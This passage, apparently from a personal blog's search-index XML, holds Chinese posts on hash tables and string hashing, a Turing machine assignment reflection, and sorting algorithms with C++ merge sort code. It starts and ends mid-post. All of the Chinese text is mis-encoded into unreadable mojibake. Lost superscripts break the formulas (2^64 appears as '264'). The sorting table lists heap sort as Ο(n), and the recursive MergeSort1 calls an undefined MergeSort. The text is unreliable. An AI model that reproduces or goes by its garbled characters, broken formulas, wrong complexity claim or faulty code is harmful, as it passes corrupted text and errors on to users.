‡ä¸º0ï¼Œæ­¥é•¿ä¸º5ã€‚é‚£ä¹ˆè¿™ä¸ªæ¢æµ‹è¿‡ç¨‹æ˜¯0,5,10,0,5,10ï¼Œä¸€ç›´åªä¼šå°è¯•è¿™ä¸‰ä¸ªä½ç½®ï¼Œæ°¸è¿œæ‰¾ä¸åˆ°ç©ºç™½ä½ç½®æ¥å­˜æ”¾ï¼Œæœ€ç»ˆä¼šå¯¼è‡´å´©æºƒã€‚</p><p>å¦‚æœæˆ‘ä»¬å“ˆå¸Œè¡¨çš„å¤§å°ä¸º13ï¼ŒæŸä¸ª<strong>ã€Œå…³é”®å­—ã€</strong>ç»è¿‡åŒå“ˆå¸Œå‡½æ•°åå¾—åˆ°çš„æ•°ç»„ä¸‹æ ‡ä¸º0ï¼Œæ­¥é•¿ä¸º5ã€‚é‚£ä¹ˆè¿™ä¸ªæ¢æµ‹è¿‡ç¨‹æ˜¯0,5,10,2,7,12,4,9,1,6,11,3ã€‚ä¼šæŸ¥æ‰¾åˆ°å“ˆå¸Œè¡¨ä¸­çš„æ¯ä¸€ä¸ªä½ç½®ã€‚</p><p>ä½¿ç”¨å¼€æ”¾åœ°å€æ³•ï¼Œä¸ç®¡ä½¿ç”¨é‚£ç§ç­–ç•¥éƒ½ä¼šæœ‰å„ç§é—®é¢˜ï¼Œå¼€æ”¾åœ°å€æ³•ä¸æ€ä¹ˆä½¿ç”¨ï¼Œåœ¨å¼€æ”¾åœ°å€æ³•ä¸­ä½¿ç”¨è¾ƒå¤šçš„æ˜¯åŒå“ˆå¸Œç­–ç•¥ã€‚</p><h2 id="å­—ç¬¦ä¸²å“ˆå¸Œ"><a href="#å­—ç¬¦ä¸²å“ˆå¸Œ" class="headerlink" title="å­—ç¬¦ä¸²å“ˆå¸Œ"></a>å­—ç¬¦ä¸²å“ˆå¸Œ</h2><p>é€šè¿‡æ¯”å¯¹å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼çš„æ–¹æ³•å¿«é€Ÿåˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒï¼Œæ“ä½œåŠæ€è·¯æ¯”KMPæ–¹æ³•ç®€å•ã€‚</p><h3 id="æ±‚å­—ç¬¦ä¸²å‰ç¼€çš„å“ˆå¸Œå€¼"><a href="#æ±‚å­—ç¬¦ä¸²å‰ç¼€çš„å“ˆå¸Œå€¼" class="headerlink" title="æ±‚å­—ç¬¦ä¸²å‰ç¼€çš„å“ˆå¸Œå€¼"></a>æ±‚å­—ç¬¦ä¸²å‰ç¼€çš„å“ˆå¸Œå€¼</h3><p>å°†ä¸€ä¸ªå­—ç¬¦ä¸²çœ‹æˆä¸€ä¸ªPè¿›åˆ¶çš„æ•°ï¼Œæœ€åè½¬åŒ–æˆ10è¿›åˆ¶æ•°</p><p>å‡å¦‚æˆ‘ä»¬è¦æ±‚ä¸€ä¸ªå­—ç¬¦ä¸²ABCDçš„å“ˆå¸Œå€¼ï¼ŒABCDå¯¹åº”1234</p><p>A    B    C    D<br>1    2    3    4<br>æˆ‘ä»¬è¦æ±‚çš„å°±æ˜¯å­—ç¬¦ä¸²çš„å‰ç¼€å“ˆå¸Œå€¼<br>h[0] = 0<br>h[1] = â€˜Aâ€™çš„å“ˆå¸Œå€¼<br>h[2] = â€˜ABâ€™çš„å“ˆå¸Œå€¼<br>h[3] = â€˜ABCâ€™çš„å“ˆå¸Œå€¼<br>h[4] = â€˜ABCDâ€™çš„å“ˆå¸Œå€¼</p><p>ABCDçš„å“ˆå¸Œå€¼ h[4] =ï¼ˆ1234ï¼‰p = 1 <em> P3 + 2 </em> P 2 + 3 <em> P1 + 4 </em> P0</p><p>å› ä¸ºè½¬åŒ–åçš„æ•°å­—å¯èƒ½å¾ˆå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹æ‰€æ±‚çš„å“ˆå¸Œå€¼å¯¹Qå–æ¨¡</p><p>é€šè¿‡è¿™æ ·ä¸€ç§æ–¹å¼å°±å¯ä»¥æŠŠä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜ å°„æˆä¸€ä¸ª0~Q-1çš„æ•°äº†</p><p>æ³¨æ„ï¼š<br>1.ä¸èƒ½å°†å­—æ¯æ˜ å°„æˆ0ï¼Œä¸€èˆ¬ä»1å¼€å§‹æ˜ å°„ï¼Œä¸ç„¶ä¼šä½¿ä¸åŒçš„å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ç›¸åŒ</p><p>2.æœ‰è¿™æ ·ä¸€ç»„ç»éªŒå€¼ï¼Œå½“P = 131 æˆ– 13331 Q = 264ï¼Œä¸”æˆ‘ä»¬ä¸é‚£ä¹ˆéï¼Œåœ¨99.99%çš„æƒ…å†µä¸‹ä¸å­˜åœ¨å†²çªï¼Œ<del>è¿™å¯ä¸æ˜¯æˆ‘è¯´çš„</del></p><p>3.å› ä¸ºQ = 264ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨unsigned long longæ¥å­˜å‚¨æ‰€æœ‰çš„å“ˆå¸Œå€¼ï¼Œå°±ä¸éœ€è¦å¯¹Qå–æ¨¡äº†ã€‚å› ä¸ºä¼šæº¢å‡ºï¼Œæ‰€ä»¥å°±ç­‰ä»·äºå–æ¨¡äº†</p><h3 id="æ±‚ä»»æ„å­—ä¸²çš„å“ˆå¸Œå€¼"><a href="#æ±‚ä»»æ„å­—ä¸²çš„å“ˆå¸Œå€¼" class="headerlink" title="æ±‚ä»»æ„å­—ä¸²çš„å“ˆå¸Œå€¼"></a>æ±‚ä»»æ„å­—ä¸²çš„å“ˆå¸Œå€¼</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æˆ‘ä»¬æ‰€æ±‚å¾—çš„å‰ç¼€å“ˆå¸Œç”¨ä¸€ä¸ªå…¬å¼ç®—å‡ºæ¥ä»»æ„ä¸€ä¸ªå­ä¸²çš„å“ˆå¸Œå€¼</p><p>å‡è®¾æˆ‘ä»¬å·²çŸ¥ä¸¤ä¸ªå‰ç¼€å“ˆå¸Œå€¼h[R],h[L - 1], ç›®æ ‡æ˜¯æ±‚å¾—L~Rçš„å“ˆå¸Œå€¼</p><p>å³h[L~R] = h[R] -h[L-1] * PR-L+1</p><p>è¯æ˜è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>h[R] = 1 <em> PR-1 + 2 </em> PR-2 + â€¦+ R <em> P0<br>h[L-1] = 1 </em> PL-2 + 2 <em> PL-2 + â€¦+ (L-1) </em> P0<br>è¦æ±‚çš„L~Rçš„å“ˆå¸Œå€¼ï¼Œ æˆ‘ä»¬éœ€è¦å°†h[L-1] <em> PR-L+1 = 1 </em> PR-1 + 2 <em> PR-2 + â€¦+ (L-1) </em> PR-L+1<br>h[L~R] = L <em> PR-L + (L+1) </em> PR-L-1 + â€¦+ R <em> P0 = h[R] - h[L-1] </em> PR-L+1</p><p>å…¶å®æœ¬è´¨å°±æ˜¯è¿›åˆ¶è½¬æ¢</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TM Reflection</title>
      <link href="/2021/07/23/TM%20Reflection/"/>
      <url>/2021/07/23/TM%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1 id="TM-Reflection"><a href="#TM-Reflection" class="headerlink" title="TM Reflection"></a>TM Reflection</h1><p>è¿™æ˜¯ç¬¬äºŒæ¬¡å›¾çµæœºå¤§ä½œä¸šå®Œæˆåçš„åæ€ä¸æ€»ç»“ï¼Œå°†åˆ†ä¸ºå¦‚ä¸‹å‡ éƒ¨åˆ†ï¼š</p><ul><li>æ¶æ„çš„åæ€</li><li>debugçš„è¿‡ç¨‹</li></ul><h2 id="æ¶æ„çš„åæ€"><a href="#æ¶æ„çš„åæ€" class="headerlink" title="æ¶æ„çš„åæ€"></a>æ¶æ„çš„åæ€</h2><p>1.TuringMachineçš„æ„é€ å‡½æ•°è¿‡äºå¤æ‚ï¼Œå¤¹æ‚äº†è®¸å¤šåŠŸèƒ½ï¼Œå¯åˆ›å»ºUtilå·¥å…·ç±»ï¼Œä½¿ä»£ç ä½è€¦åˆï¼Œæ•°æ®ä¸èŒè´£ä¸€è‡´</p><p>2.Q, State,TransitionFuctionä¹‹é—´çš„æ˜ å°„å…³ç³»è¦ç†æ¸…ï¼Œæ˜¯ä¸ªä¸é”™çš„æ¶æ„ï¼Œå€¼å¾—å­¦ä¹ </p><p>3.å¯¹äºExecutorï¼Œå®ƒæ‹¥æœ‰çš„æ˜¯Tapesï¼Œå› æ­¤ä»–çš„å¿«ç…§ç­‰åŠŸèƒ½åº”è¯¥æ˜¯è°ƒç”¨Tapeçš„æ–¹æ³•æ¥â€œæ‹¼å‡‘â€å®ç°æ•´ä½“ï¼Œè€Œä¸åº”è¯¥åœ¨Executorä¸­è°ƒç”¨åˆ°Trackså±‚é¢</p><h2 id="debugçš„è¿‡ç¨‹"><a href="#debugçš„è¿‡ç¨‹" class="headerlink" title="debugçš„è¿‡ç¨‹"></a>debugçš„è¿‡ç¨‹</h2><p>1.ç¬¬ä¸€æ¬¡è¿è¡Œï¼Œä»€ä¹ˆé”™è¯¯ä¿¡æ¯éƒ½æ²¡æœ‰ï¼Œä»€ä¹ˆè¾“å‡ºéƒ½æ²¡æœ‰ï¼Œåˆç†æ¨æµ‹é—®é¢˜åœ¨Executeæ–¹æ³•ï¼Œå¤„ç†äº†ä¸€ç³»åˆ—æ ¼å¼åŒ–é—®é¢˜ï¼Œéƒ½æ€ªçŒªè„šéœ€æ±‚å†™çš„ä¸æ¸…æ¥šï¼ˆæ‹æ¡Œå­ï¼‰</p><p>å‘ç°éœ€è¦çŸ¥é“ç©ºæ ¼ç¬¦å·ï¼Œä½¿æˆ‘ä¸‹å®šäº†æ”¹ä¸ºè‡ªé¡¶è€Œä¸‹æ¶æ„çš„å†³å¿ƒï¼ŒExecutoræ²¡æœ‰ç†ç”±éœ€è¦çŸ¥é“Bæ˜¯ä»€ä¹ˆç¬¦å·ï¼Œä¸€æ¬¡é‡æ„ï¼Œè´¹äº†ç‚¹æ—¶é—´ï¼Œä½†ä¹Ÿç®—æœ‰æ”¶è·</p><p>2.è‚‰çœ¼å¯¹æ¯”è¾“å‡ºç»“æœçš„æˆ‘åƒä¸ªæ†¨æ‰¹ï¼Œä¸‹æ¬¡ä¸•å®šï¼ˆ</p><p>3.ç¬¬äºŒæ¬¡è¿è¡Œï¼Œå‘ç°å¤šæŠ¥äº†é”™è¯¯æµä¿¡æ¯ï¼Œå±…ç„¶æŠŠStringç›´æ¥æ‰”åˆ°Characteré›†åˆä¸­äº†ï¼Œæˆ‘å½“æ—¶æ€•æ˜¯å†™å‚»äº†</p><p>4.é¡ºæ‰‹æŠŠé”™è¯¯æ£€æŸ¥å…¨è¿‡äº†ï¼ŒResolveråˆ¤æ–­æ˜¯å¦å†²çªéœ€è¦å¯¹ä¸Šæ–‡æ‰€è¯´ä¸¤é‡æ˜ å°„å®Œå…¨ç†è§£</p><p>5.æœ€åä¸€å‡ºé”™ç‚¹ï¼ŒæŒ‚æ‰æˆ‘4ä¸ªç”¨ä¾‹ï¼Œå±…ç„¶æ˜¯å¾ˆæµ…æ˜¾çš„é”™è¯¯ï¼Œç§»åŠ¨ç£å¤´ï¼ˆæˆ‘ä¸€ç›´å¾ˆç›¸ä¿¡ä½ çš„å•Šå–‚â€¦â€¦ï¼‰ï¼Œå†ä¸€æ¬¡è­¦å‘Šè‡ªå·±ä¸è¦ä¹±å¤åˆ¶</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ’åºç®—æ³•æ•´ç†</title>
      <link href="/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="æ’åºç®—æ³•"><a href="#æ’åºç®—æ³•" class="headerlink" title="æ’åºç®—æ³•"></a>æ’åºç®—æ³•</h1><p>å¯¹å„ç±»æ’åºæ–¹æ³•æ•´ç†å¦‚ä¸‹ï¼š</p><div class="table-container"><table><thead><tr><th><strong>æ’åºç®—æ³•</strong></th><th><strong>æ—¶é—´å¤æ‚åº¦</strong></th></tr></thead><tbody><tr><td>å½’å¹¶æ’åº</td><td>ÎŸ(nlog2n)</td></tr><tr><td>å¿«é€Ÿæ’åº</td><td>æç«¯ÎŸ(n2)ï¼Œæœ€å¥½ÎŸ(nlog2n)</td></tr><tr><td>å †æ’åº</td><td>ÎŸ(n)</td></tr><tr><td>è®¡æ•°æ’åº</td><td>O(n+k),kä¸ºæ•´æ•°çš„èŒƒå›´</td></tr><tr><td>åŸºæ•°æ’åº</td><td><strong>ÎŸ((n + k) *d)</strong> ï¼ŒnæŒ‡<strong>åˆ†é…</strong>nä¸ªæ•°è¦næ¬¡ï¼ŒkæŒ‡<strong>æ„å»ºkä¸ªæ¡¶</strong>ï¼Œdä¸ºä½æ•°**)</td></tr></tbody></table></div><h2 id="å½’å¹¶æ’åº"><a href="#å½’å¹¶æ’åº" class="headerlink" title="å½’å¹¶æ’åº"></a><strong>å½’å¹¶æ’åº</strong></h2><p>å¦‚ä¸‹å›¾ï¼Œå‡è®¾è¦å¯¹é•¿åº¦ä¸ºnçš„æ•°åˆ—Aè¿›è¡Œæ’åºï¼Œå½’å¹¶æ’åºçš„æ€æƒ³å°±æ˜¯<strong>Divide&amp;Conquer</strong>åˆ†å¼€å¹¶å…‹æœï¼Œé¦–å…ˆå°†Aç€åŠæ‹†åˆ†ä¸ºå·¦æ•°åˆ—Lå’Œæœ‰æ•°åˆ—Rï¼Œç„¶ååˆ†åˆ«å¯¹Lå’ŒRè¿›è¡Œå„è‡ªçš„æ’åºï¼Œæœ€åè¿›è¡ŒLå’ŒRçš„åˆå¹¶æ“ä½œã€‚</p><p><img src="https://img2020.cnblogs.com/blog/1820479/202004/1820479-20200403104649348-448131316.png" alt="img"></p><p>åœ¨è¯¥è¯¾ç¨‹é‡Œï¼Œè®²å¸ˆæåˆ°äº†å½’å¹¶æ’åºç”¨çš„æ˜¯ä¸€ç§å«<strong>Two FingersåŒæŒ‡ç®—æ³•</strong>ï¼Œè¿™é‡Œæˆ‘ç”¨ä¸Šå›¾çš„åˆ—å­è¿›è¡Œè®²è¿°ï¼š</p><ol><li>å¦‚æœæ•°åˆ—aä¸º[20,13,7,2,12,11,9,1]ï¼Œå°†å®ƒæŠ˜åŠæ‹†ä¸ºå·¦æ•°åˆ—Lï¼š[20,13,7,2]ï¼Œå³æ•°åˆ—Rï¼š[12, 11, 9, 1];</li><li>å¯¹æ•°åˆ—Lå’ŒRå„è‡ªè¿›è¡Œæ’åºï¼Œæ–¹æ³•ç”¨å†’æ³¡æ’åºæˆ–å…¶ä»–æ’åºæ‰‹æ®µéƒ½è¡Œ;</li><li>ä¹‹åç”¨ç®­å¤´ï¼ˆæŒ‡ä»£æ‰‹æŒ‡ï¼‰æŒ‡å‘æ•°åˆ—Lå’ŒRæœ€å°çš„å…ƒç´ ï¼Œè¿›è¡Œæ¯”è¾ƒï¼Œå¹¶å…ˆè¾“å‡ºè¿™ä¸ªæœ€å°çš„å…ƒç´ ï¼Œå¦‚ä¸Šå›¾å°±æ˜¯min(1,2)=1ã€‚</li><li>ä¹‹ååœ¨è¯¥æœ€å°å…ƒç´ ä¸‹ç§»åŠ¨ç®­å¤´è‡³ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå°†å…¶ä¸åŸæ¥å¦ä¸€ä¸ªæ•°åˆ—å…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚ä¸Šå›¾å°±æ˜¯æ•°åˆ—Rçš„ç®­å¤´ç§»è‡³9, æ•°åˆ—Lç”±äºä¸Šä¸€æ­¥ä¸æ˜¯æœ€å°å€¼ï¼Œæ‰€ä»¥ç®­å¤´ä¸å˜ï¼Œåˆ™å¯¹æ¯”ç®­å¤´æ‰€æŒ‡å…ƒç´ çš„åˆ°min(2, 9)=2ï¼Œè¾“å‡ºç»“æœã€‚é‡å¤ä¸Šè¿°æ“ä½œç®­å¤´åˆ°è¾¾å„è‡ªæ•°åˆ—æœ«å°¾ã€‚</li></ol><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™é‡Œå¤æ‚åº¦ä¸º<strong>ÎŸ(nlog2n)</strong>ã€‚è¿™é‡Œå¯ä»¥ç®€å•çš„åˆ†ä¸ºä¸¤å—ï¼šï¼ˆ1ï¼‰<strong>äºŒè·¯å½’å¹¶éœ€è¦è¿›è¡Œlog2næ¬¡</strong>ï¼›ï¼ˆ2ï¼‰<strong>åŒæŒ‡ç®—æ³•å¯¹å•æ¬¡äºŒè·¯å½’å¹¶è¿›è¡Œnæ¬¡ç®­å¤´ç§»åŠ¨ï¼ˆå¸®åŠ©è¿›è¡Œæœ€å°å€¼æ¯”è¾ƒæ“ä½œï¼‰</strong>ã€‚å› æ­¤å°±æ˜¯nlog2næ¬¡ã€‚</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/2b2dce38f298729431e797ff2f6ca2260c579caa70c3fb3a/0" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> mid,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="comment">//lowä¸ºç¬¬1æœ‰åºåŒºçš„ç¬¬1ä¸ªå…ƒç´ ï¼ŒiæŒ‡å‘ç¬¬1ä¸ªå…ƒç´ , midä¸ºç¬¬1æœ‰åºåŒºçš„æœ€å1ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="keyword">int</span> i=low,j=mid+<span class="number">1</span>,k=<span class="number">0</span>; <span class="comment">//mid+1ä¸ºç¬¬2æœ‰åºåŒºç¬¬1ä¸ªå…ƒç´ ï¼ŒjæŒ‡å‘ç¬¬1ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in"><span class="keyword">new</span></span>(nothrow) <span class="keyword">int</span>[high-low+<span class="number">1</span>]; <span class="comment">//tempæ•°ç»„æš‚å­˜åˆå¹¶çš„æœ‰åºåºåˆ—</span></span><br><span class="line">    <span class="keyword">if</span>(!temp)&#123; <span class="comment">//å†…å­˜åˆ†é…å¤±è´¥</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&lt;=arr[j]) <span class="comment">//è¾ƒå°çš„å…ˆå­˜å…¥tempä¸­</span></span><br><span class="line">            temp[k++]=arr[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            temp[k++]=arr[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)<span class="comment">//è‹¥æ¯”è¾ƒå®Œä¹‹åï¼Œç¬¬ä¸€ä¸ªæœ‰åºåŒºä»æœ‰å‰©ä½™ï¼Œåˆ™ç›´æ¥å¤åˆ¶åˆ°tæ•°ç»„ä¸­</span></span><br><span class="line">        temp[k++]=arr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=high)<span class="comment">//åŒä¸Š</span></span><br><span class="line">        temp[k++]=arr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=low,k=<span class="number">0</span>;i&lt;=high;i++,k++)<span class="comment">//å°†æ’å¥½åºçš„å­˜å›arrä¸­lowåˆ°highè¿™åŒºé—´</span></span><br><span class="line">arr[i]=temp[k];</span><br><span class="line">    <span class="keyword">delete</span> []temp;<span class="comment">//åˆ é™¤æŒ‡é’ˆï¼Œç”±äºæŒ‡å‘çš„æ˜¯æ•°ç»„ï¼Œå¿…é¡»ç”¨delete []</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//ç”¨é€’å½’åº”ç”¨äºŒè·¯å½’å¹¶å‡½æ•°å®ç°æ’åºâ€”â€”åˆ†æ²»æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort1</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,low,mid);</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,mid+<span class="number">1</span>,high);</span><br><span class="line">        <span class="built_in">Merge</span>(arr,low,mid,high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç”¨éé€’å½’åº”ç”¨äºŒè·¯å½’å¹¶å‡½æ•°å®ç°æ’åºâ€”â€”åˆ†æ²»æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort2</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> n)</span><span class="comment">//nä»£è¡¨æ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°ï¼Œå³æ•°ç»„æœ€å¤§ä¸‹æ ‡æ˜¯n-1&#123;</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function">int step = 1;</span></span></span><br><span class="line"><span class="comment"><span class="function">while(step&lt;n) //å½“å…ƒç´ ä¸ªæ•°ä¸æ˜¯2çš„å¹‚æ—¶å¯èƒ½ä¼šå‡ºé”™ï¼Œæœªè€ƒè™‘ç¬¬2ä¸ªåºåˆ—ä¸ªæ•°ä¸è¶³çš„æƒ…å†µ</span></span></span><br><span class="line"><span class="comment"><span class="function">&#123;</span></span></span><br><span class="line"><span class="comment"><span class="function">for(int i=0;i&lt;=n-step-1;i+=2*step)</span></span></span><br><span class="line"><span class="comment"><span class="function">Merge(arr,i,i+step-1,i+2*step-1);</span></span></span><br><span class="line"><span class="comment"><span class="function">step*=2;</span></span></span><br><span class="line"><span class="comment"><span class="function">&#125;*/</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> size</span>=<span class="number">1</span>,low,mid,high;</span><br><span class="line"><span class="keyword">while</span>(size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">low=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low+size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">mid=low+size<span class="number">-1</span>;</span><br><span class="line">high=mid+size;</span><br><span class="line"><span class="keyword">if</span>(high&gt;n<span class="number">-1</span>)<span class="comment">//ç¬¬äºŒä¸ªåºåˆ—ä¸ªæ•°ä¸è¶³size</span></span><br><span class="line">high=n<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">Merge</span>(arr,low,mid,high);<span class="comment">//è°ƒç”¨å½’å¹¶å­å‡½æ•°</span></span><br><span class="line">low=high+<span class="number">1</span>;<span class="comment">//ä¸‹ä¸€æ¬¡å½’å¹¶æ—¶ç¬¬ä¸€å…³åºåˆ—çš„ä¸‹ç•Œ</span></span><br><span class="line">&#125;</span><br><span class="line">size*=<span class="number">2</span>;<span class="comment">//èŒƒå›´æ‰©å¤§ä¸€å€</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h2><p>å®ƒæ˜¯ä¸€ç§éå¸¸é«˜æ•ˆä¹Ÿå¾ˆå¸¸ç”¨çš„æ’åºç®—æ³•ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªé›¶ä»¶ï¼šleftå·¦æŒ‡é’ˆï¼Œrightå³æŒ‡é’ˆå’ŒbaseåŸºå‡†æ•°ã€‚ä¸¾ä¸ªä¾‹å­å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/4046a55350b105743a315ad7a0e8689acd1fee115ea3a730/0" alt="img"></p><ul><li>é¦–å…ˆå‡è®¾æ•°åˆ—aä¸º[6, 3, 7, 4, 1]ï¼Œåˆ™<strong>leftå·¦æŒ‡é’ˆä¸ºæ•°åˆ—aæœ€å¼€å§‹çš„å…ƒç´ </strong>6ï¼Œ<strong>rightå³æŒ‡é’ˆä¸ºæ•°åˆ—bæœ€æœ«ç«¯çš„å…ƒç´ </strong>1ï¼Œ<strong>baseåŸºå‡†æ•°ä¸ºleftå·¦æŒ‡é’ˆ</strong>6ï¼ˆæ³¨æ„è¿™ä¸ª<strong>baseåŸºå‡†æ•°ä»å¤´åˆ°å°¾éƒ½ä¸æ”¹åŠ¨</strong>çš„ï¼‰ã€‚</li></ul><ol><li>å…ˆä»rightæŒ‡å‘çš„æ•°ä¸baseå¯¹æ¯”ï¼š</li></ol><ul><li>å¦‚æœright&lt;baseï¼Œåˆ™å°†rightå€¼æ›¿æ¢leftå€¼ï¼Œç„¶åleftå‘å³ç§»ä¸€ä½ï¼ŒåŒæ—¶rightå€¼æ›¿æ¢ä¸ºç©ºå€¼ï¼Œä¸”rightæŒ‡é’ˆä½ç½®ä¸å˜ï¼Œç„¶åè®©leftæ­¤æ—¶æŒ‡çš„æ•°ä¸baseå¯¹æ¯”ã€‚</li><li>å¦‚æœright&gt;baseï¼Œåˆ™å°†rightå€¼æ›¿æ¢rightå€¼ï¼ˆå³ä¿æŒä¸å˜ï¼‰ï¼Œç„¶årightå‘å·¦ç§»ä¸€ä½ï¼ŒåŒæ—¶leftå€¼æ›¿æ¢ä¸ºç©ºå€¼ï¼Œä¸”leftæŒ‡é’ˆä½ç½®ä¸å˜ï¼Œç„¶åè®©rightæ­¤æ—¶æŒ‡çš„æ•°ä¸baseå¯¹æ¯”ã€‚</li></ul><ol><li><p>é‡å¤ä¸Šè¿°æ“ä½œï¼Œç›´åˆ°å·¦å³æŒ‡é’ˆé‡å ï¼Œæ­¤æ—¶å°±ç›´æ¥å°†baseå€¼æ”¾å…¥é‡å ä½ç½®å³å¯ã€‚</p><p>æ€»ç»“ä¸Šé¢çš„å°±æ˜¯ï¼š<strong>å…ˆå³å¼€å§‹å¯¹æ¯”ï¼Œä¹‹åâ€™å°äºåˆ™æ›¿æ¢leftå¹¶ç§»leftï¼Œç„¶åæ–°leftå¯¹æ¯”baseâ€™æˆ–â€™å¤§äºåˆ™æ›¿æ¢rightå¹¶ç§»rightï¼Œç„¶åæ–°rightå¯¹æ¯”baseâ€˜, leftå’Œrighté‡åˆåç”¨baseæ›¿æ¢</strong>ã€‚å®ƒçš„æ—¶é—´å¤æ‚åº¦<strong>å–å†³äºbaseå€¼çœŸå®åœ¨æ’åºåçš„ä½ç½®</strong>ï¼Œå¦‚æœbaseåˆšå¥½ä¸º<strong>æ’åºä¸­é—´çš„ä½ç½®</strong>ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º<strong>ÎŸ(nlog2n)</strong>ï¼Œå¦‚æœbaseä¸ºæ•°åˆ—<strong>æœ€å¤§å€¼æˆ–æœ€å°å€¼</strong>ï¼Œåˆ™ä¸º<strong>ÎŸ(n2)</strong>ã€‚</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span 